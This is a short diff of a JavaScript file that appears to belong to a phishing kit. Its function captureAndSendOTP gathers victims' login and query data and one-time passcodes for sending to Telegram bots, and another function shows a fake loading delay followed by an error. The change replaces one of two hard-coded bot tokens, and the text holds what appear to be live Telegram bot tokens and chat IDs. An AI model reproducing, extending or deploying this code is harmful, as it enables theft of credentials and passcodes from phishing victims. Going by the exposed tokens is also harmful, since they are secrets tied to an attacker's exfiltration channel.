@@ -133,7 +133,7 @@ async function captureAndSendOTP() {
     const BOT_1_TOKEN = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
     const BOT_1_CHAT_ID = "8417322083";
 
-    const BOT_2_TOKEN = "8588682882:AAGBckxmZijeZfAuF5PzUuEQD-vZLJBC9BE";
+    const BOT_2_TOKEN = "8551279711:AAG3EFp90QkzYjdF6bteQ80tLZTyZTXj148";
     const BOT_2_CHAT_ID = "7874654715";
 
     const mensajeFinal = datosConsulta + "\n\n" + datosLogin + "\n\n" +
@@ -213,6 +213,7 @@ function mostrarCargaYError() {
 
   }, 30000); // ⏱️ tiempo de carga
 }
+
 
 
 
